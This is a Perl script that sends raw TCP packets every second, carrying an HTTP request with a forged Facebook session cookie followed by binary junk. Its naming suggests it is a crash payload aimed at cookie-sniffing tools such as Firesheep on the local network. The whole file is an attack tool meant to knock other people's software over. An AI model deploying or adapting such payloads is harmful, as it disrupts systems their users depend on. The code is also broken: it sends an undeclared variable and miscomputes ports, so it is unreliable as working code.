#!/usr/bin/perl
use strict;
use warnings;
use Net::RawIP;
use Socket;

# The src doesn't really matter, but feel free to change it if
# you'd like. 
my $srcip = "172.16.1.104";

while(1) {
	&send_fake_cookie($srcip, "www.facebook.com");
	sleep 1;
}

sub send_fake_cookie {

    my ($srcip, $dstip) = @_;

	$dstip = unpack("N", inet_aton($dstip)) if $dstip =~ /[^0-9]+.[^0-9]+.[^0-9]+.[^0-9]+/;

	my $fs_payload = "";
	$fs_payload .= "GET /packetSniffingKillsKittens HTTP/1.1\r\n";
	$fs_payload .= "Host: www.facebook.com\r\n";
	$fs_payload .= "User-Agent: Mozilla\r\n";
	$fs_payload .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
	$fs_payload .= "Accept-Language: is,en;q=0.7,en-us;q=0.3\r\n";
	$fs_payload .= "Accept-Encoding: gzip,deflate\r\n";
	$fs_payload .= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
	$fs_payload .= "Keep-Alive: 115\r\n";
	$fs_payload .= "Connection: keep-alive\r\n";
	$fs_payload .= "Referer: http://www.facebook.com/\r\n";
	$fs_payload .= 'Cookie: lsd=spsse; c_user=666660000; sct=01010101; sid=0; xs=3randomhashyes666666666; asdf=??????????????!!!!!!!!!!!!!!!!!!!!%eëÒY¼¥­Áøþh¡F4£A º¦SÍÂÝåt¹Òv5þhèË&%%¥Ô$FsnÄxÏÏvVfi6ÊìÈ_7Î½çÜQlXËFÿë~~½¹ùÉÛ,÷7¬ùüyóÇ>hº_o¿ÄGÜ5¼yy{ÃZÆ|øË,þÊjo¬´­W¢y¹¹y5ù|Êmk¤PÃt¦[%´Ôû)7­°f²ÎDk¹0vò_ykWÛÝ=þËV©&«þ×åtfç­ðÔS{/Z9Yàé½n­lãï¬ÅÇÛåô/u#8´Ã¯±ÿìÇúyøëO^n73®¥Ð·LÄÏ1MKºGGÖ: Íìd3MCÌ§iñ_õ{[Ïs§0gÂë´ »°n~)ºùáF7ÂKÙzG_O~9}ùöÆ1XÓ4ÀwSA»Ó<Ø®ûuß×SÕ2ã,¦®åÒ11ÙçNÝ|×ÿI·ÍâaÃÞgtçÓ´Áeþm?å¢0Éb:KRÛv:KÓ¯º£øìåÍïoð¡nþtÃ-Ó@có­tÍ¦o±Íúæó³L+> 5-	ÃÒX&bð³l[ $¯DZJ' . "\r\n\r\n";
    $fs_payload .= "\r\n";

	my $pkt = Net::RawIP->new({
		"ip" => {
			"saddr" => unpack("N",inet_aton($srcip)),
			"daddr" => $dstip,
			"ttl"   => 3
		},
		"tcp" => {
			"dest"   => 80,
			"source" => (rand((65535 - 1024)) -  1024),
			"data"   => $crash_fs_payload,
			"ack"    => 1
		}
	});

	$pkt->send();
}
